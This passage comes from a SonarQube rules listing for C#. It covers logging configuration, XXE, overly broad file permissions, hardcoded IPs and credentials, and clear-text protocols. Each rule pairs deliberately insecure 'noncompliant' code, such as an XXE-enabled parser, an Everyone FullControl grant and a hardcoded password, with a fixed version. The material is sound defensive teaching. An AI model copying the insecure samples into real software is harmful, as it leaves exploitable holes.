  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-0285">CVE-2018-0285</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-1127">CVE-2000-1127</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-15113">CVE-2017-15113</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5742">CVE-2015-5742</a> </li>
</ul>
<p>Logs are useful before, during and after a security incident.</p>
<ul>
  <li> Attackers will most of the time start their nefarious work by probing the system for vulnerabilities. Monitoring this activity and stopping it
  is the first step to prevent an attack from ever happening. </li>
  <li> In case of a successful attack, logs should contain enough information to understand what damage an attacker may have inflicted. </li>
</ul>
<p>Logs are also a target for attackers because they might contain sensitive information. Configuring loggers has an impact on the type of information
logged and how they are logged.</p>
<p>This rule flags for review code that initiates loggers configuration. The goal is to guide security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> unauthorized users might have access to the logs, either because they are stored in an insecure location or because the application gives
  access to them. </li>
  <li> the logs contain sensitive information on a production server. This can happen when the logger is in debug mode. </li>
  <li> the log can grow without limit. This can happen when additional information is written into logs every time a user performs an action and the
  user can perform the action as many times as he/she wants. </li>
  <li> the logs do not contain enough information to understand the damage an attacker might have inflicted. The loggers mode (info, warn, error)
  might filter out important information. They might not print contextual information like the precise time of events or the server hostname. </li>
  <li> the logs are only stored locally instead of being backuped or replicated. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Check that your production deployment doesn’t have its loggers in "debug" mode as it might write sensitive information in logs. </li>
  <li> Production logs should be stored in a secure location which is only accessible to system administrators. </li>
  <li> Configure the loggers to display all warnings, info and error messages. Write relevant information such as the precise time of events and the
  hostname. </li>
  <li> Choose log format which is easy to parse and process automatically. It is important to process logs rapidly in case of an attack so that the
  impact is known and limited. </li>
  <li> Check that the permissions of the log files are correct. If you index the logs in some other service, make sure that the transfer and the
  service are secure too. </li>
  <li> Add limits to the size of the logs and make sure that no user can fill the disk with logs. This can happen even when the user does not control
  the logged information. An attacker could just repeat a logged action many times. </li>
</ul>
<p>Remember that configuring loggers properly doesn’t make them bullet-proof. Here is a list of recommendations explaining on how to use your
logs:</p>
<ul>
  <li> Don’t log any sensitive information. This obviously includes passwords and credit card numbers but also any personal information such as user
  names, locations, etc…​ Usually any information which is protected by law is good candidate for removal. </li>
  <li> Sanitize all user inputs before writing them in the logs. This includes checking its size, content, encoding, syntax, etc…​ As for any user
  input, validate using whitelists whenever possible. Enabling users to write what they want in your logs can have many impacts. It could for example
  use all your storage space or compromise your log indexing service. </li>
  <li> Log enough information to monitor suspicious activities and evaluate the impact an attacker might have on your systems. Register events such as
  failed logins, successful logins, server side input validation failures, access denials and any important transaction. </li>
  <li> Monitor the logs for any suspicious activity. </li>
</ul>
<h2>Sensitive Code Example</h2>
<p><strong>.Net Core</strong>: configure programmatically</p>
<pre>
using System;
using System.Collections;
using System.Collections.Generic;
using Microsoft.AspNetCore.Builder;
using Microsoft.AspNetCore.Hosting;
using Microsoft.Extensions.Configuration;
using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Logging;
using Microsoft.Extensions.Options;
using Microsoft.AspNetCore;

namespace MvcApp
{
    public class ProgramLogging
    {
        public static IWebHostBuilder CreateWebHostBuilder(string[] args) =&gt;
            WebHost.CreateDefaultBuilder(args)
                .ConfigureLogging((hostingContext, logging) =&gt; // Sensitive
                {
                    // ...
                })
                .UseStartup&lt;StartupLogging&gt;();
    }

    public class StartupLogging
    {
        public void ConfigureServices(IServiceCollection services)
        {
            services.AddLogging(logging =&gt; // Sensitive
            {
                // ...
            });
        }

        public void Configure(IApplicationBuilder app, IHostingEnvironment env, ILoggerFactory loggerFactory)
        {
            IConfiguration config = null;
            LogLevel level = LogLevel.Critical;
            Boolean includeScopes = false;
            Func&lt;string,Microsoft.Extensions.Logging.LogLevel,bool&gt; filter = null;
            Microsoft.Extensions.Logging.Console.IConsoleLoggerSettings consoleSettings = null;
            Microsoft.Extensions.Logging.AzureAppServices.AzureAppServicesDiagnosticsSettings azureSettings = null;
            Microsoft.Extensions.Logging.EventLog.EventLogSettings eventLogSettings = null;

            // An issue will be raised for each call to an ILoggerFactory extension methods adding loggers.
            loggerFactory.AddAzureWebAppDiagnostics(); // Sensitive
            loggerFactory.AddAzureWebAppDiagnostics(azureSettings); // Sensitive
            loggerFactory.AddConsole(); // Sensitive
            loggerFactory.AddConsole(level); // Sensitive
            loggerFactory.AddConsole(level, includeScopes); // Sensitive
            loggerFactory.AddConsole(filter); // Sensitive
            loggerFactory.AddConsole(filter, includeScopes); // Sensitive
            loggerFactory.AddConsole(config); // Sensitive
            loggerFactory.AddConsole(consoleSettings); // Sensitive
            loggerFactory.AddDebug(); // Sensitive
            loggerFactory.AddDebug(level); // Sensitive
            loggerFactory.AddDebug(filter); // Sensitive
            loggerFactory.AddEventLog(); // Sensitive
            loggerFactory.AddEventLog(eventLogSettings); // Sensitive
            loggerFactory.AddEventLog(level); // Sensitive
            loggerFactory.AddEventSourceLogger(); // Sensitive

            IEnumerable&lt;ILoggerProvider&gt; providers = null;
            LoggerFilterOptions filterOptions1 = null;
            IOptionsMonitor&lt;LoggerFilterOptions&gt; filterOptions2 = null;

            LoggerFactory factory = new LoggerFactory(); // Sensitive
            new LoggerFactory(providers); // Sensitive
            new LoggerFactory(providers, filterOptions1); // Sensitive
            new LoggerFactory(providers, filterOptions2); // Sensitive
        }
    }
}
</pre>
<p><strong>Log4Net</strong></p>
<pre>
using System;
using System.IO;
using System.Xml;
using log4net.Appender;
using log4net.Config;
using log4net.Repository;

namespace Logging
{
    class Log4netLogging
    {
        void Foo(ILoggerRepository repository, XmlElement element, FileInfo configFile, Uri configUri, Stream configStream,
        IAppender appender, params IAppender[] appenders) {
            log4net.Config.XmlConfigurator.Configure(repository); // Sensitive
            log4net.Config.XmlConfigurator.Configure(repository, element); // Sensitive
            log4net.Config.XmlConfigurator.Configure(repository, configFile); // Sensitive
            log4net.Config.XmlConfigurator.Configure(repository, configUri); // Sensitive
            log4net.Config.XmlConfigurator.Configure(repository, configStream); // Sensitive
            log4net.Config.XmlConfigurator.ConfigureAndWatch(repository, configFile); // Sensitive

            log4net.Config.DOMConfigurator.Configure(); // Sensitive
            log4net.Config.DOMConfigurator.Configure(repository); // Sensitive
            log4net.Config.DOMConfigurator.Configure(element); // Sensitive
            log4net.Config.DOMConfigurator.Configure(repository, element); // Sensitive
            log4net.Config.DOMConfigurator.Configure(configFile); // Sensitive
            log4net.Config.DOMConfigurator.Configure(repository, configFile); // Sensitive
            log4net.Config.DOMConfigurator.Configure(configStream); // Sensitive
            log4net.Config.DOMConfigurator.Configure(repository, configStream); // Sensitive
            log4net.Config.DOMConfigurator.ConfigureAndWatch(configFile); // Sensitive
            log4net.Config.DOMConfigurator.ConfigureAndWatch(repository, configFile); // Sensitive

            log4net.Config.BasicConfigurator.Configure(); // Sensitive
            log4net.Config.BasicConfigurator.Configure(appender); // Sensitive
            log4net.Config.BasicConfigurator.Configure(appenders); // Sensitive
            log4net.Config.BasicConfigurator.Configure(repository); // Sensitive
            log4net.Config.BasicConfigurator.Configure(repository, appender); // Sensitive
            log4net.Config.BasicConfigurator.Configure(repository, appenders); // Sensitive
        }
    }
}
</pre>
<p><strong>NLog</strong>: configure programmatically</p>
<pre>
namespace Logging
{
    class NLogLogging
    {
        void Foo(NLog.Config.LoggingConfiguration config) {
            NLog.LogManager.Configuration = config; // Sensitive, this changes the logging configuration.
        }
    }
}
</pre>
<p><strong>Serilog</strong></p>
<pre>
namespace Logging
{
    class SerilogLogging
    {
        void Foo() {
            new Serilog.LoggerConfiguration(); // Sensitive
        }
    }
}
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/">Top 10 2021 Category A9 - Security Logging and
  Monitoring Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A10_2017-Insufficient_Logging%2526Monitoring">Top 10 2017 Category A10 -
  Insufficient Logging &amp; Monitoring</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/117">CWE-117 - Improper Output Neutralization for Logs</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/532">CWE-532 - Information Exposure Through Log Files</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=csharpsquid:S2755">
              csharpsquid:S2755
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability allows the usage of external entities in XML.</p>
<h2>Why is this an issue?</h2>
<p>External Entity Processing allows for XML parsing with the involvement of external entities. However, when this functionality is enabled without
proper precautions, it can lead to a vulnerability known as XML External Entity (XXE) attack.</p>
<h3>What is the potential impact?</h3>
<h4>Exposing sensitive data</h4>
<p>One significant danger of XXE vulnerabilities is the potential for sensitive data exposure. By crafting malicious XML payloads, attackers can
reference external entities that contain sensitive information, such as system files, database credentials, or configuration files. When these
entities are processed during XML parsing, the attacker can extract the contents and gain unauthorized access to sensitive data. This poses a severe
threat to the confidentiality of critical information.</p>
<h4>Exhausting system resources</h4>
<p>Another consequence of XXE vulnerabilities is the potential for denial-of-service attacks. By exploiting the ability to include external entities,
attackers can construct XML payloads that cause resource exhaustion. This can overwhelm the system’s memory, CPU, or other critical resources, leading
to system unresponsiveness or crashes. A successful DoS attack can disrupt the availability of services and negatively impact the user experience.</p>
<h4>Forging requests</h4>
<p>XXE vulnerabilities can also enable Server-Side Request Forgery (SSRF) attacks. By leveraging the ability to include external entities, an attacker
can make the vulnerable application send arbitrary requests to other internal or external systems. This can result in unintended actions, such as
retrieving data from internal resources, scanning internal networks, or attacking other systems. SSRF attacks can lead to severe consequences,
including unauthorized data access, system compromise, or even further exploitation within the network infrastructure.</p>
<h2>How to fix it in .NET</h2>
<h3>Code examples</h3>
<p>The following code contains examples of XML parsers that have external entity processing enabled. As a result, the parsers are vulnerable to XXE
attacks if an attacker can control the XML file that is processed.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
using System.Xml;

public static void decode()
{
    XmlDocument parser = new XmlDocument();
    parser.XmlResolver = new XmlUrlResolver(); // Noncompliant
    parser.LoadXml("xxe.xml");
}
</pre>
<h4>Compliant solution</h4>
<p><code>XmlDocument</code> is safe by default since .NET Framework 4.5.2. For older versions, set <code>XmlResolver</code> explicitly to
<code>null</code>.</p>
<pre data-diff-id="1" data-diff-type="compliant">
using System.Xml;

public static void decode()
{
    XmlDocument parser = new XmlDocument();
    parser.XmlResolver = null;
    parser.LoadXml("xxe.xml");
}
</pre>
<h3>How does this work?</h3>
<h4>Disable external entities</h4>
<p>The most effective approach to prevent XXE vulnerabilities is to disable external entity processing entirely, unless it is explicitly required for
specific use cases. By default, XML parsers should be configured to reject the processing of external entities. This can be achieved by setting the
appropriate properties or options in your XML parser library or framework.</p>
<p>If external entity processing is necessary for certain scenarios, adopt a whitelisting approach to restrict the entities that can be resolved
during XML parsing. Create a list of trusted external entities and disallow all others. This approach ensures that only known and safe entities are
processed.<br> You should rely on features provided by your XML parser to restrict the external entities.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A4_2017-XML_External_Entities_(XXE)">Top 10 2017 Category A4 - XML External
  Entities (XXE)</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/611">CWE-611 - Information Exposure Through XML External Entity Reference</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/827">CWE-827 - Improper Control of Document Type Definition</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=csharpsquid:S2612">
              csharpsquid:S2612
            </a>
          </td>
          <td>
            <details>
              <p>In Unix, "others" class refers to all users except the owner of the file and the members of the group assigned to this file.</p>
<p>In Windows, "Everyone" group is similar and includes all members of the Authenticated Users group as well as the built-in Guest account, and
several other built-in security accounts.</p>
<p>Granting permissions to these groups can lead to unintended access to files.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The application is designed to be run on a multi-user environment. </li>
  <li> Corresponding files and directories may contain confidential information. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>The most restrictive possible permissions should be assigned to files and directories.</p>
<h2>Sensitive Code Example</h2>
<p>.Net Framework:</p>
<pre>
var unsafeAccessRule = new FileSystemAccessRule("Everyone", FileSystemRights.FullControl, AccessControlType.Allow);

var fileSecurity = File.GetAccessControl("path");
fileSecurity.AddAccessRule(unsafeAccessRule); // Sensitive
fileSecurity.SetAccessRule(unsafeAccessRule); // Sensitive
File.SetAccessControl("fileName", fileSecurity);
</pre>
<p>.Net / .Net Core</p>
<pre>
var fileInfo = new FileInfo("path");
var fileSecurity = fileInfo.GetAccessControl();

fileSecurity.AddAccessRule(new FileSystemAccessRule("Everyone", FileSystemRights.Write, AccessControlType.Allow)); // Sensitive
fileInfo.SetAccessControl(fileSecurity);
</pre>
<p>.Net / .Net Core using Mono.Posix.NETStandard</p>
<pre>
var fileSystemEntry = UnixFileSystemInfo.GetFileSystemEntry("path");
fileSystemEntry.FileAccessPermissions = FileAccessPermissions.OtherReadWriteExecute; // Sensitive
</pre>
<h2>Compliant Solution</h2>
<p>.Net Framework</p>
<pre>
var safeAccessRule = new FileSystemAccessRule("Everyone", FileSystemRights.FullControl, AccessControlType.Deny);

var fileSecurity = File.GetAccessControl("path");
fileSecurity.AddAccessRule(safeAccessRule);
File.SetAccessControl("path", fileSecurity);
</pre>
<p>.Net / .Net Core</p>
<pre>
var safeAccessRule = new FileSystemAccessRule("Everyone", FileSystemRights.FullControl, AccessControlType.Deny);

var fileInfo = new FileInfo("path");
var fileSecurity = fileInfo.GetAccessControl();
fileSecurity.SetAccessRule(safeAccessRule);
fileInfo.SetAccessControl(fileSecurity);
</pre>
<p>.Net / .Net Core using Mono.Posix.NETStandard</p>
<pre>
var fs = UnixFileSystemInfo.GetFileSystemEntry("path");
fs.FileAccessPermissions = FileAccessPermissions.UserExecute;
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/">Top 10 2021 Category A4 - Insecure Design</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control">Top 10 2017 Category A5 - Broken Access Control</a>
  </li>
  <li> <a
  href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission">OWASP File Permission</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/732">CWE-732 - Incorrect Permission Assignment for Critical Resource</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/266">CWE-266 - Incorrect Privilege Assignment</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=csharpsquid:S3884">
              csharpsquid:S3884
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated, and will eventually be removed.</p>
<h2>Why is this an issue?</h2>
<p><code>CoSetProxyBlanket</code> and <code>CoInitializeSecurity</code> both work to set the permissions context in which the process invoked
immediately after is executed. Calling them from within that process is useless because it’s too late at that point; the permissions context has
already been set.</p>
<p>Specifically, these methods are meant to be called from non-managed code such as a C++ wrapper that then invokes the managed, i.e. C# or VB.NET,
code.</p>
<h3>Noncompliant code example</h3>
<pre>
[DllImport("ole32.dll")]
static extern int CoSetProxyBlanket([MarshalAs(UnmanagedType.IUnknown)]object pProxy, uint dwAuthnSvc, uint dwAuthzSvc,
	[MarshalAs(UnmanagedType.LPWStr)] string pServerPrincName, uint dwAuthnLevel, uint dwImpLevel, IntPtr pAuthInfo,
	uint dwCapabilities);

public enum RpcAuthnLevel
{
	Default = 0,
	None = 1,
	Connect = 2,
	Call = 3,
	Pkt = 4,
	PktIntegrity = 5,
	PktPrivacy = 6
}

public enum RpcImpLevel
{
	Default = 0,
	Anonymous = 1,
	Identify = 2,
	Impersonate = 3,
	Delegate = 4
}

public enum EoAuthnCap
{
	None = 0x00,
	MutualAuth = 0x01,
	StaticCloaking = 0x20,
	DynamicCloaking = 0x40,
	AnyAuthority = 0x80,
	MakeFullSIC = 0x100,
	Default = 0x800,
	SecureRefs = 0x02,
	AccessControl = 0x04,
	AppID = 0x08,
	Dynamic = 0x10,
	RequireFullSIC = 0x200,
	AutoImpersonate = 0x400,
	NoCustomMarshal = 0x2000,
	DisableAAA = 0x1000
}

[DllImport("ole32.dll")]
public static extern int CoInitializeSecurity(IntPtr pVoid, int cAuthSvc, IntPtr asAuthSvc, IntPtr pReserved1,
	RpcAuthnLevel level, RpcImpLevel impers, IntPtr pAuthList, EoAuthnCap dwCapabilities, IntPtr pReserved3);

static void Main(string[] args)
{
	var hres1 = CoSetProxyBlanket(null, 0, 0, null, 0, 0, IntPtr.Zero, 0); // Noncompliant

	var hres2 = CoInitializeSecurity(IntPtr.Zero, -1, IntPtr.Zero, IntPtr.Zero, RpcAuthnLevel.None,
		RpcImpLevel.Impersonate, IntPtr.Zero, EoAuthnCap.None, IntPtr.Zero); // Noncompliant
}
</pre>
<h2>Resources</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/648">CWE-648 - Incorrect Use of Privileged APIs</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=csharpsquid:S1313">
              csharpsquid:S1313
            </a>
          </td>
          <td>
            <details>
              <p>Hardcoding IP addresses is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-5901">CVE-2006-5901</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3725">CVE-2005-3725</a> </li>
</ul>
<p>Today’s services have an ever-changing architecture due to their scaling and redundancy needs. It is a mistake to think that a service will always
have the same IP address. When it does change, the hardcoded IP will have to be modified too. This will have an impact on the product development,
delivery, and deployment:</p>
<ul>
  <li> The developers will have to do a rapid fix every time this happens, instead of having an operation team change a configuration file. </li>
  <li> It misleads to use the same address in every environment (dev, sys, qa, prod). </li>
</ul>
<p>Last but not least it has an effect on application security. Attackers might be able to decompile the code and thereby discover a potentially
sensitive address. They can perform a Denial of Service attack on the service, try to get access to the system, or try to spoof the IP address to
bypass security checks. Such attacks can always be possible, but in the case of a hardcoded IP address solving the issue will take more time, which
will increase an attack’s impact.</p>
<h2>Ask Yourself Whether</h2>
<p>The disclosed IP address is sensitive, e.g.:</p>
<ul>
  <li> Can give information to an attacker about the network topology. </li>
  <li> It’s a personal (assigned to an identifiable person) IP address. </li>
</ul>
<p>There is a risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Don’t hard-code the IP address in the source code, instead make it configurable with environment variables, configuration files, or a similar
approach. Alternatively, if confidentially is not required a domain name can be used since it allows to change the destination quickly without having
to rebuild the software.</p>
<h2>Sensitive Code Example</h2>
<pre>
var ip = "192.168.12.42";
var address = IPAddress.Parse(ip);
</pre>
<h2>Compliant Solution</h2>
<pre>
var ip = ConfigurationManager.AppSettings["myapplication.ip"];
var address = IPAddress.Parse(ip);
</pre>
<h2>Exceptions</h2>
<p>No issue is reported for the following cases because they are not considered sensitive:</p>
<ul>
  <li> Loopback addresses 127.0.0.0/8 in CIDR notation (from 127.0.0.0 to 127.255.255.255) </li>
  <li> Broadcast address 255.255.255.255 </li>
  <li> Non-routable address 0.0.0.0 </li>
  <li> Strings of the form <code>2.5.&lt;number&gt;.&lt;number&gt;</code> as they <a href="http://www.oid-info.com/introduction.htm">often match
  Object Identifiers</a> (OID) </li>
  <li> Addresses in the ranges 192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24, reserved for documentation purposes by <a
  href="https://datatracker.ietf.org/doc/html/rfc5737">RFC 5737</a> </li>
  <li> Addresses in the range 2001:db8::/32, reserved for documentation purposes by <a href="https://datatracker.ietf.org/doc/html/rfc3849">RFC
  3849</a> </li>
</ul>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=csharpsquid:S2068">
              csharpsquid:S2068
            </a>
          </td>
          <td>
            <details>
              <p>Because it is easy to extract strings from an application source code or binary, credentials should not be hard-coded. This is particularly true
for applications that are distributed or that are open-source.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-13466">CVE-2019-13466</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15389">CVE-2018-15389</a> </li>
</ul>
<p>Credentials should be stored outside of the code in a configuration file, a database, or a management service for secrets.</p>
<p>This rule flags instances of hard-coded credentials used in database and LDAP connections. It looks for hard-coded credentials in connection
strings, and for variable names that match any of the patterns from the provided list.</p>
<p>It’s recommended to customize the configuration of this rule with additional credential words such as "oauthToken", "secret", …​</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> Credentials allow access to a sensitive component like a database, a file storage, an API or a service. </li>
  <li> Credentials are used in production environments. </li>
  <li> Application re-distribution is required before updating the credentials. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Store the credentials in a configuration file that is not pushed to the code repository. </li>
  <li> Store the credentials in a database. </li>
  <li> Use your cloud provider’s service for managing secrets. </li>
  <li> If a password has been disclosed through the source code: change it. </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
string username = "admin";
string password = "Admin123"; // Sensitive
string usernamePassword  = "user=admin&amp;password=Admin123"; // Sensitive
string url = "scheme://user:Admin123@domain.com"; // Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
string username = "admin";
string password = GetEncryptedPassword();
string usernamePassword = string.Format("user={0}&amp;password={1}", GetEncryptedUsername(), GetEncryptedPassword());
string url = $"scheme://{username}:{password}@domain.com";

string url2 = "http://guest:guest@domain.com"; // Compliant
const string Password_Property = "custom.password"; // Compliant
</pre>
<h2>Exceptions</h2>
<ul>
  <li> Issue is not raised when URI username and password are the same. </li>
  <li> Issue is not raised when searched pattern is found in variable name and value. </li>
</ul>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication">Top 10 2017 Category A2 - Broken Authentication</a>
  </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/798">CWE-798 - Use of Hard-coded Credentials</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/259">CWE-259 - Use of Hard-coded Password</a> </li>
  <li> Derived from FindSecBugs rule <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#HARD_CODE_PASSWORD">Hard Coded Password</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=csharpsquid:S5332">
              csharpsquid:S5332
            </a>
          </td>
          <td>
            <details>
              <p>Clear-text protocols such as <code>ftp</code>, <code>telnet</code>, or <code>http</code> lack encryption of transported data, as well as the
capability to build an authenticated connection. It means that an attacker able to sniff traffic from the network can read, modify, or corrupt the
transported content. These protocols are not secure as they expose applications to an extensive range of risks:</p>
<ul>
  <li> sensitive data exposure </li>
  <li> traffic redirected to a malicious endpoint </li>
  <li> malware-infected software update or installer </li>
  <li> execution of client-side code </li>
  <li> corruption of critical information </li>
</ul>
<p>Even in the context of isolated networks like offline environments or segmented cloud environments, the insider threat exists. Thus, attacks
involving communications being sniffed or tampered with can still happen.</p>
<p>For example, attackers could successfully compromise prior security layers by:</p>
<ul>
  <li> bypassing isolation mechanisms </li>
  <li> compromising a component of the network </li>
  <li> getting the credentials of an internal IAM account (either from a service account or an actual person) </li>
</ul>
<p>In such cases, encrypting communications would decrease the chances of attackers to successfully leak data or steal credentials from other network
components. By layering various security practices (segmentation and encryption, for example), the application will follow the
<em>defense-in-depth</em> principle.</p>
<p>Note that using the <code>http</code> protocol is being deprecated by <a
href="https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http">major web browsers</a>.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul>
  <li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-6169">CVE-2019-6169</a> </li>
  <li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-12327">CVE-2019-12327</a> </li>
  <li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-11065">CVE-2019-11065</a> </li>
</ul>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> Application data needs to be protected against falsifications or leaks when transiting over the network. </li>
  <li> Application data transits over an untrusted network. </li>
  <li> Compliance rules require the service to encrypt data in transit. </li>
  <li> Your application renders web pages with a relaxed mixed content policy. </li>
  <li> OS-level protections against clear-text traffic are deactivated. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Make application data transit over a secure, authenticated and encrypted protocol like TLS or SSH. Here are a few alternatives to the most
  common clear-text protocols:
    <ul>
      <li> Use <code>ssh</code> as an alternative to <code>telnet</code>. </li>
      <li> Use <code>sftp</code>, <code>scp</code>, or <code>ftps</code> instead of <code>ftp</code>. </li>
      <li> Use <code>https</code> instead of <code>http</code>. </li>
      <li> Use <code>SMTP</code> over <code>SSL/TLS</code> or <code>SMTP</code> with <code>STARTTLS</code> instead of clear-text SMTP. </li>
    </ul>  </li>
  <li> Enable encryption of cloud components communications whenever it is possible. </li>
  <li> Configure your application to block mixed content when rendering web pages. </li>
  <li> If available, enforce OS-level deactivation of all clear-text traffic. </li>
</ul>
<p>It is recommended to secure all transport channels, even on local networks, as it can take a single non-secure connection to compromise an entire
application or system.</p>
<h2>Sensitive Code Example</h2>
<pre>
var urlHttp = "http://example.com";                 // Noncompliant
var urlFtp = "ftp://anonymous@example.com";         // Noncompliant
var urlTelnet = "telnet://anonymous@example.com";   // Noncompliant
</pre>
<pre>
using var smtp = new SmtpClient("host", 25); // Noncompliant, EnableSsl is not set
using var telnet = new MyTelnet.Client("host", port); // Noncompliant, rule raises Security Hotspot on any member containing "Telnet"
</pre>
<h2>Compliant Solution</h2>
<pre>
var urlHttps = "https://example.com";
var urlSftp = "sftp://anonymous@example.com";
var urlSsh = "ssh://anonymous@example.com";
</pre>
<pre>
using var smtp = new SmtpClient("host", 25) { EnableSsl = true };
using var ssh = new MySsh.Client("host", port);
</pre>
<h2>Exceptions</h2>
<p>No issue is reported for the following cases because they are not considered sensitive:</p>
<ul>
  <li> Insecure protocol scheme followed by loopback addresses like 127.0.0.1 or <code>localhost</code>. </li>
</ul>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data Exposure
  </a> </li>
  <li> OWASP - <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements">Mobile AppSec
  Verification Standard - Network Communication Requirements</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication">Mobile Top 10 2016 Category M3 - Insecure
  Communication</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/200">CWE-200 - Exposure of Sensitive Information to an Unauthorized Actor</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/319">CWE-319 - Cleartext Transmission of Sensitive Information</a> </li>
  <li> <a href="https://security.googleblog.com/2016/09/moving-towards-more-secure-web.html">Google, Moving towards more secure web</a> </li>
  <li> <a href="https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http/">Mozilla, Deprecating non secure http</a> </li>
  <li> <a href="https://docs.aws.amazon.com/elasticloadbalancing/latest/application/load-balancer-listeners.html">AWS Documentation</a> - Listeners
